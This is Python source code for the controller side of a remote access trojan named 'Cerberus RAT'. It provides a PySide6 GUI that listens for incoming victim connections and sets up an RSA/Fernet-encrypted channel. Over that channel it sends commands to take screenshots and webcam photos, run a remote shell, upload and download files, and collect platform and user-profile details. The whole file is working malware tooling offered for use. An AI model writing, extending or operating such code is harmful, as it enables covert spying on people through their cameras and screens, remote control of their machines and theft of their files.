import os
import socket
import datetime
import time
import sys
import datetime
import subprocess
from struct import pack, unpack
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.hazmat.primitives import serialization, hashes
    from PySide6.QtCore import (QCoreApplication, QDate, QDateTime, QLocale,
        QMetaObject, QObject, QPoint, QRect,
        QSize, QTime, QUrl, Qt, QEvent)
    from PySide6.QtGui import (QBrush, QColor, QConicalGradient, QCursor,
        QFont, QFontDatabase, QGradient, QIcon,
        QImage, QKeySequence, QLinearGradient, QPainter,
        QPalette, QPixmap, QRadialGradient, QTransform)
    from PySide6.QtWidgets import (QApplication, QGridLayout, QLineEdit, QPushButton,
        QScrollArea, QSizePolicy, QWidget, QMainWindow, QSizePolicy,
        QTabWidget, QTextEdit, QLabel, QVBoxLayout, QGridLayout, QSpacerItem, QProgressBar, QDialog, QMessageBox)
except:
    os.system('pip install cryptography pyside6')
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.hazmat.primitives import serialization, hashes
    from PySide6.QtCore import (QCoreApplication, QDate, QDateTime, QLocale,
        QMetaObject, QObject, QPoint, QRect,
        QSize, QTime, QUrl, Qt, QEvent)
    from PySide6.QtGui import (QBrush, QColor, QConicalGradient, QCursor,
        QFont, QFontDatabase, QGradient, QIcon,
        QImage, QKeySequence, QLinearGradient, QPainter,
        QPalette, QPixmap, QRadialGradient, QTransform)
    from PySide6.QtWidgets import (QApplication, QGridLayout, QLineEdit, QPushButton,
        QScrollArea, QSizePolicy, QWidget, QMainWindow, QSizePolicy,
        QTabWidget, QTextEdit, QLabel, QVBoxLayout, QGridLayout, QSpacerItem, QProgressBar, QDialog, QMessageBox)


class FileManager(object):
    def setupUi(self, Form, parent_window):
        if not Form.objectName():
            Form.setObjectName(u"Form")
        Form.resize(701, 334)
        Form.setStyleSheet(u"background-color: rgb(8, 8, 8); color: rgb(91, 236, 81);")
        self.form = Form
        self.parent_window = parent_window
        self.gridLayoutWidget = QWidget(Form)
        self.gridLayoutWidget.setObjectName(u"gridLayoutWidget")
        self.gridLayout = QGridLayout(self.gridLayoutWidget)
        self.gridLayout.setObjectName(u"gridLayout")
        self.gridLayout.setContentsMargins(0, 0, 0, 0)
        Form.setLayout(self.gridLayout)
        self.pushButton_3 = QPushButton(self.gridLayoutWidget)
        self.pushButton_3.setObjectName(u"pushButton_3")
        sizePolicy = QSizePolicy(QSizePolicy.Policy.Expanding, QSizePolicy.Policy.Expanding)
        sizePolicy.setHorizontalStretch(0)
        sizePolicy.setVerticalStretch(0)
        sizePolicy.setHeightForWidth(self.pushButton_3.sizePolicy().hasHeightForWidth())
        self.pushButton_3.setSizePolicy(sizePolicy)

        self.gridLayout.addWidget(self.pushButton_3, 5, 1, 1, 1)

        self.lineEdit = QLineEdit(self.gridLayoutWidget)
        self.lineEdit.setObjectName(u"lineEdit")
        self.lineEdit.setStyleSheet(u"border: 1px solid rgb(91, 236, 81);")

        self.gridLayout.addWidget(self.lineEdit, 1, 1, 1, 5)

        self.verticalSpacer = QSpacerItem(20, 40, QSizePolicy.Policy.Minimum, QSizePolicy.Policy.Expanding)

        self.gridLayout.addItem(self.verticalSpacer, 4, 3, 1, 1)

        self.horizontalSpacer_3 = QSpacerItem(40, 20, QSizePolicy.Policy.Minimum, QSizePolicy.Policy.Minimum)

        self.gridLayout.addItem(self.horizontalSpacer_3, 5, 6, 1, 1)

        self.horizontalSpacer_2 = QSpacerItem(40, 20, QSizePolicy.Policy.Expanding, QSizePolicy.Policy.Minimum)

        self.gridLayout.addItem(self.horizontalSpacer_2, 5, 2, 1, 1)

        self.verticalSpacer_2 = QSpacerItem(20, 40, QSizePolicy.Policy.Minimum, QSizePolicy.Policy.Expanding)

        self.gridLayout.addItem(self.verticalSpacer_2, 2, 1, 1, 1)

        self.pushButton_2 = QPushButton(self.gridLayoutWidget)
        self.pushButton_2.setObjectName(u"pushButton_2")
        sizePolicy.setHeightForWidth(self.pushButton_2.sizePolicy().hasHeightForWidth())
        self.pushButton_2.setSizePolicy(sizePolicy)

        self.gridLayout.addWidget(self.pushButton_2, 5, 5, 1, 1)

        self.horizontalSpacer = QSpacerItem(40, 20, QSizePolicy.Policy.Expanding, QSizePolicy.Policy.Minimum)

        self.gridLayout.addItem(self.horizontalSpacer, 5, 4, 1, 1)

        self.pushButton = QPushButton(self.gridLayoutWidget)
        self.pushButton.setObjectName(u"pushButton")
        sizePolicy.setHeightForWidth(self.pushButton.sizePolicy().hasHeightForWidth())
        self.pushButton.setSizePolicy(sizePolicy)

        self.gridLayout.addWidget(self.pushButton, 5, 3, 1, 1)

        self.horizontalSpacer_4 = QSpacerItem(40, 20, QSizePolicy.Policy.Minimum, QSizePolicy.Policy.Minimum)

        self.gridLayout.addItem(self.horizontalSpacer_4, 5, 0, 1, 1)

        self.verticalSpacer_3 = QSpacerItem(20, 40, QSizePolicy.Policy.Minimum, QSizePolicy.Policy.Expanding)

        self.gridLayout.addItem(self.verticalSpacer_3, 0, 1, 1, 1)

        self.lineEdit_2 = QLineEdit(self.gridLayoutWidget)
        self.lineEdit_2.setObjectName(u"lineEdit_2")
        self.lineEdit_2.setStyleSheet(u"border: 1px solid rgb(91, 236, 81);")

        self.gridLayout.addWidget(self.lineEdit_2, 3, 1, 1, 5)

        self.verticalSpacer_4 = QSpacerItem(20, 10, QSizePolicy.Policy.Minimum, QSizePolicy.Policy.Minimum)

        self.gridLayout.addItem(self.verticalSpacer_4, 6, 3, 1, 1)


        self.retranslateUi(Form)

        QMetaObject.connectSlotsByName(Form)

    def retranslateUi(self, Form):
        Form.setWindowTitle(QCoreApplication.translate("Form", u"Manage files", None))
        self.pushButton_3.setText(QCoreApplication.translate("Form", u"Upload", None))
        self.pushButton_3.clicked.connect(self.upload)
        self.lineEdit.setPlaceholderText(QCoreApplication.translate("Form", u"Local path", None))
        self.pushButton_2.setText(QCoreApplication.translate("Form", u"Download", None))
        self.pushButton_2.clicked.connect(self.download)
        self.pushButton.setText(QCoreApplication.translate("Form", u"Cancel", None))
        self.pushButton.clicked.connect(self.form.close)
        self.lineEdit_2.setPlaceholderText(QCoreApplication.translate("Form", u"Remote path", None))
    
    def upload(self):
        try:
            client, fernet = self.parent_window.client, self.parent_window.fernet
            cmd = f'send {self.lineEdit_2.text()} {self.lineEdit.text()}'
            cmd = Command(cmd, fernet, client)
            cmd.execute()
        except Exception as e:
            print(e)
            self.parent_window.control_client()
    
    def download(self):
        try:
            client, fernet = self.parent_window.client, self.parent_window.fernet
            cmd = f'get {self.lineEdit_2.text()} {self.lineEdit.text()}'
            cmd = Command(cmd, fernet, client)
            cmd.execute()
        except Exception as e:
            print(e)
            self.parent_window.control_client()


class KeyPressFilter(QObject):

    def eventFilter(self, widget, event):
        if event.type() == QEvent.KeyPress:
            text = event.text()
            if text == '\r':
                self.window.executeCommand()
        return False


class Ui_Form(object):
    def setupUi(self, Form, parent_window):
        if not Form.objectName():
            Form.setObjectName(u"Form")
        self.parent_window = parent_window
        Form.resize(829, 619)
        font = QFont()
        font.setPointSize(16)
        Form.setFont(font)
        Form.setStyleSheet(u"background-color: rgb(8, 8, 8);\n"
"color: rgb(91, 236, 81);")
        self.gridLayoutWidget = QWidget(Form)
        self.gridLayoutWidget.setObjectName(u"gridLayoutWidget")
        self.gridLayout = QGridLayout(self.gridLayoutWidget)
        self.gridLayout.setObjectName(u"gridLayout")
        self.gridLayout.setContentsMargins(0, 0, 0, 0)
        Form.setLayout(self.gridLayout)
        self.pushButton = QPushButton(self.gridLayoutWidget)
        self.pushButton.setObjectName(u"pushButton")
        sizePolicy = QSizePolicy(QSizePolicy.Policy.Minimum, QSizePolicy.Policy.Fixed)
        sizePolicy.setHorizontalStretch(0)
        sizePolicy.setVerticalStretch(0)
        sizePolicy.setHeightForWidth(self.pushButton.sizePolicy().hasHeightForWidth())
        self.pushButton.setSizePolicy(sizePolicy)

        self.gridLayout.addWidget(self.pushButton, 1, 1, 1, 1)

        self.lineEdit = QLineEdit(self.gridLayoutWidget)
        self.lineEdit.setObjectName(u"lineEdit")
        self.lineEdit.setStyleSheet(u"border: 1px solid rgb(91, 236, 81);")

        self.gridLayout.addWidget(self.lineEdit, 1, 0, 1, 1)

        self.scrollArea = QScrollArea(self.gridLayoutWidget)
        self.scrollArea.setObjectName(u"scrollArea")
        self.scrollArea.setWidgetResizable(True)
        self.scrollAreaWidgetContents = QWidget()
        self.scrollAreaWidgetContents.setObjectName(u"scrollAreaWidgetContents")
        self.scrollAreaWidgetContents.setGeometry(QRect(0, 0, 825, 571))
        self.scrollArea.setWidget(self.scrollAreaWidgetContents)
        self.verticalLayout = QVBoxLayout()
        self.scrollAreaWidgetContents.setLayout(self.verticalLayout)

        self.label = QLabel()
        self.label.setAlignment(Qt.AlignmentFlag.AlignTop|Qt.AlignmentFlag.AlignLeft)
        self.verticalLayout.addWidget(self.label)

        self.gridLayout.addWidget(self.scrollArea, 0, 0, 1, 2)

        self.retranslateUi(Form)
        
        self.eventFilter = KeyPressFilter(parent=self.lineEdit)
        self.lineEdit.installEventFilter(self.eventFilter)
        self.eventFilter.window = self

        QMetaObject.connectSlotsByName(Form)

    def retranslateUi(self, Form):
        Form.setWindowTitle(QCoreApplication.translate("Form", u"Terminal", None))
        self.pushButton.setText(QCoreApplication.translate("Form", u"\u23ce", None))
        self.pushButton.clicked.connect(self.executeCommand)

    def executeCommand(self):
        if self.lineEdit.text() == '':
            return
        try:
            client = self.parent_window.client
            fernet = self.parent_window.fernet
            cmd = Command(self.lineEdit.text(), fernet, client)
            data = cmd.execute()
            self.label.setText(data)
            self.lineEdit.setText('')
        except Exception as e:
            print(e)
            self.parent_window.control_client()


class Ui_MainWindow(object):
    def setupUi(self, MainWindow):
        if not MainWindow.objectName():
            MainWindow.setObjectName(u"MainWindow")
        MainWindow.resize(1089, 769)
        MainWindow.setMinimumSize(QSize(1089, 769))
        MainWindow.setMaximumSize(QSize(1089, 769))
        font = QFont()
        font.setPointSize(20)
        MainWindow.setFont(font)
        MainWindow.setWindowTitle(u"Cerberus RAT")
        MainWindow.setAutoFillBackground(False)
        MainWindow.setStyleSheet(u"background-color: rgb(8, 8, 8);\n"
"color: rgb(91, 236, 81);\n"
"")
        MainWindow.setToolButtonStyle(Qt.ToolButtonStyle.ToolButtonIconOnly)
        MainWindow.setTabShape(QTabWidget.TabShape.Rounded)
        self.centralwidget = QWidget(MainWindow)
        self.centralwidget.setObjectName(u"centralwidget")
        self.centralwidget.setFont(font)
        self.pushButton = QPushButton(self.centralwidget)
        self.pushButton.setObjectName(u"pushButton")
        self.pushButton.setGeometry(QRect(10, 620, 351, 131))
        self.pushButton.setFont(font)
        self.pushButton_2 = QPushButton(self.centralwidget)
        self.pushButton_2.setObjectName(u"pushButton_2")
        self.pushButton_2.setGeometry(QRect(10, 480, 351, 131))
        self.pushButton_2.setFont(font)
        self.pushButton_3 = QPushButton(self.centralwidget)
        self.pushButton_3.setObjectName(u"pushButton_3")
        self.pushButton_3.setGeometry(QRect(370, 620, 351, 131))
        self.pushButton_3.setFont(font)
        self.pushButton_4 = QPushButton(self.centralwidget)
        self.pushButton_4.setObjectName(u"pushButton_4")
        self.pushButton_4.setGeometry(QRect(370, 480, 351, 131))
        self.pushButton_4.setFont(font)
        self.pushButton_5 = QPushButton(self.centralwidget)
        self.pushButton_5.setObjectName(u"pushButton_5")
        self.pushButton_5.setGeometry(QRect(730, 480, 351, 131))
        self.pushButton_5.setFont(font)
        self.pushButton_6 = QPushButton(self.centralwidget)
        self.pushButton_6.setObjectName(u"pushButton_6")
        self.pushButton_6.setGeometry(QRect(730, 620, 351, 131))
        self.pushButton_6.setFont(font)
        self.textEdit = QTextEdit(self.centralwidget)
        self.textEdit.setObjectName(u"textEdit")
        self.textEdit.setGeometry(QRect(20, 12, 1051, 451))
        self.textEdit.setReadOnly(True)
        MainWindow.setCentralWidget(self.centralwidget)

        self.retranslateUi(MainWindow)

        QMetaObject.connectSlotsByName(MainWindow)
    # setupUi

    def retranslateUi(self, MainWindow):
        self.pushButton.setText(QCoreApplication.translate("MainWindow", u"Screenshot", None))
        self.pushButton.clicked.connect(self.screenshot)
        self.pushButton_2.setText(QCoreApplication.translate("MainWindow", u"Camera shot", None))
        self.pushButton_2.clicked.connect(self.camera)
        self.pushButton_3.setText(QCoreApplication.translate("MainWindow", u"Open terminal", None))
        self.pushButton_3.clicked.connect(self.open_terminal)
        self.pushButton_4.setText(QCoreApplication.translate("MainWindow", u"Get/send a file", None))
        self.pushButton_4.clicked.connect(self.file_actions)
        self.pushButton_5.setText(QCoreApplication.translate("MainWindow", u"TODO", None))
        self.pushButton_6.setText(QCoreApplication.translate("MainWindow", u"Exit", None))
        self.pushButton_6.clicked.connect(self.stop)
        self.control_client()
    # retranslateUi

    def file_actions(self):
        self.file_manager_window = QWidget()
        self.file_manager = FileManager()
        self.file_manager.setupUi(self.file_manager_window, self)
        self.file_manager_window.show()

    def screenshot(self):
        try:
            cmd = Command('screenshot', self.fernet, self.client)
            cmd.execute()
        except:
            self.control_client()
    
    def camera(self):
        try:
            cmd = Command('webcam', self.fernet, self.client)
            cmd.execute()
        except:
            self.control_client()
    
    def stop(self):
        exit()

    def open_terminal(self):
        self.terminal_widget = QWidget()
        self.terminal = Ui_Form()
        self.terminal.setupUi(self.terminal_widget, self)
        self.terminal_widget.show()
    
    def get_os_info(self):
        try:
            cmd = Command('platform', self.fernet, self.client)
            data = cmd.execute() + f'\nClient IP: {self.ip[0]}\nConnection port: {str(self.ip[1])}'
            self.textEdit.setText(data)
        except:
            self.control_client()
    
    def control_client(self):
        print('Generating encryption key...')
        fernet_key = Fernet.generate_key()
        self.fernet = Fernet(fernet_key)
        print('Waiting for connection...')
        self.client, self.ip = host.accept()
        print('Client connected. Exchanging encryption keys...')
        rsa_public_key = serialization.load_pem_public_key(self.client.recv(1024))
        self.client.send(rsa_public_key.encrypt(fernet_key, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)))
        self.get_os_info()
        print('Success.')


class MyMainWindow(QMainWindow):
    def closeEvent(self, event):
        result = QMessageBox.question(self,
                      "Confirm Exit...",
                      "Are you sure you want to exit ?",
                      QMessageBox.Yes| QMessageBox.No)
        event.ignore()

        if result == QMessageBox.Yes:
            exit()


PACKAGE_SIZE = 15000
HOST_ADDRESS = '0.0.0.0'

HOST_PORT = 8935


def save_file(data, filename):
    file = open(filename, 'wb')
    file.write(data)
    file.close()


def parse_args(line):
    args = list(line.split())
    args.pop(0)
    return args


def open_image(path):
    imageViewerFromCommandLine = {'linux':'xdg-open',
                                  'win32':'explorer',
                                  'darwin':'open'}[sys.platform]
    subprocess.Popen([imageViewerFromCommandLine, path])


def send_data(data, connection, fernet):
    if type(data) != bytes: data = data.encode()

    data = fernet.encrypt(data)

    length = pack('>Q', len(data))

    connection.sendall(length)
    connection.sendall(data)

    ack = connection.recv(1)


def receive_data(connection, fernet):
    bs = connection.recv(8)
    (length,) = unpack('>Q', bs)
    data = b''
    while len(data) < length:
        to_read = length - len(data)
        data += connection.recv(
            4096 if to_read > 4096 else to_read)

    connection.sendall(b'\00')

    data = fernet.decrypt(data)

    return data


class Command():

    def __init__(self, text, fernet, connection):
        self.plaintext = text
        self.fernet = fernet
        self.cmd = self.plaintext.encode()
        self.connection = connection

    def execute(self):
        global locale
        if self.plaintext[:3] == 'get':
            args = self.plaintext.split()
            path = args[2]
            self.plaintext = 'get ' + args[1]
            self.cmd = self.plaintext.encode()
            send_data(self.cmd, self.connection, self.fernet)
            data = receive_data(self.connection, self.fernet)
            save_file(data, path)
            return
        elif self.plaintext[:4] == 'send':
            args = self.plaintext.split()
            path = args[2]
            self.plaintext = 'send ' + args[1]
            self.cmd = self.plaintext.encode()
            send_data(self.cmd, self.connection, self.fernet)
            receive_data(self.connection, self.fernet)
            file = open(path, 'rb')
            data = file.read()
            file.close()
            send_data(data, self.connection, self.fernet)
            receive_data(self.connection, self.fernet)
            return
        send_data(self.cmd, self.connection, self.fernet)
        data = receive_data(self.connection, self.fernet)
        if self.plaintext == 'screenshot' or self.plaintext == 'webcam':
            path = str(datetime.datetime.now()) + '.png'
            save_file(data, path)
            open_image(path)
        elif self.plaintext == 'platform':
            data = data.decode().split(f'%%%%')
            if len(data) == 4:
                locale = data[3]
            data = f'Platform: {data[0]}\nUser profile: {data[1]}\nExecuted from: {data[2]}'
            return data
        else:
            return data.decode(locale)


locale = 'utf-8'

host = socket.socket()

host.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
host.bind((HOST_ADDRESS, HOST_PORT))
host.listen(5)

app = QApplication(sys.argv)
main_window = MyMainWindow()
main_ui = Ui_MainWindow()
main_ui.setupUi(main_window)
main_window.show()
app.exec()
